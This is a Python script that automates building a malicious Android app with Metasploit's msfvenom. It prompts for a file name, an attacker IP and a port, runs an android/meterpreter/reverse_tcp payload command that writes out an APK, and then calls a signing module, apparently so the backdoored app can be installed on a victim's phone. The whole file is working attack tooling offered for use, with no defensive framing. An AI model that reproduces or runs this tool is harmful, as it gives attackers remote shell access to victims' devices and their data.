import os
import time
import android_signer
import apache_server
import subprocess

#def the function to generate the apk
def android_msfvenom():
    get_gen = raw_input('[+] Generate apk using msfvenom: ')
    if get_gen == 'yes' or get_gen == 'y':
        get_name = raw_input('[+] Enter the name of the desired apk file: ')
        try:
            apk_name = get_name
        except Exception:
            print('[+] Failed to set name: {}! Exitting...'.format(apk_name))
            time.sleep(3)
        else:
            print('[+] Name set to: {}'.format(get_name))
            
        #try to change the directory
        login = os.getlogin()
        print('[+] Attempting to change directory to /{}/Desktop'.format(login))

        try:
            os.chdir('/{}/Desktop'.format(login))
        except Exception:
            working_direc = os.getcwd()
            print('[+] Could not change the directory to the desktop, look for file under {}'.format(working_direc))
        else:
            print('[+] Directory set to {}'.format(os.getcwd()))

        #get LHOST and LPORT
        get_host = raw_input('[+] Enter ip address: ')
        get_port = raw_input('[+] Enter connect back port: ')
        print('[+] Generating apk(defaulting to desktop)...')
        try:
            subprocess.call(('msfvenom -p android/meterpreter/reverse_tcp LHOST={} LPORT={} R > {}.apk'.format(get_host, get_port, get_name)), shell=True)
        except Exception:
            print('[+] Failed to generate apk! Exitting...')
            time.sleep(3)
        else:
            print('[+] Apk file successfully created! File located in {}'.format(os.getcwd()))

    elif get_gen == 'no' or get_gen == 'n':
        print('[+] Quittting...')
        exit()
        time.sleep(3)

android_msfvenom()
android_signer.sign_apk()
